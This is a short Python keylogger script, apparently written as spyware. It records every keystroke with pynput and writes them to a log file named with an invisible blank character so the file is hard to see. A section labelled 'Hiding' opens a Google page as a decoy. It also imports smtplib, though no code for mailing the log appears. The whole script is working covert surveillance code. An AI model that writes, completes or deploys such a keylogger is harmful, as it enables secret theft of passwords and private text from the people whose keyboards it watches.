from pynput.keyboard import Listener
import re
import os
import smtplib


############
###Hiding###
############

import webbrowser
webbrowser.open('https://www.google.com.br')


#######################
###Creating log file###
#######################

opening = open("⠀.txt", "a")
simp_path = '⠀.txt'
abs_path = os.path.abspath(simp_path)
arqlog = (abs_path)


#######################
###Catching keyboard###
#######################

def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '',tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    print(tecla)

    with open(arqlog, "a") as log:
        log.write(tecla)


with Listener(on_press=capturar) as l:
    l.join()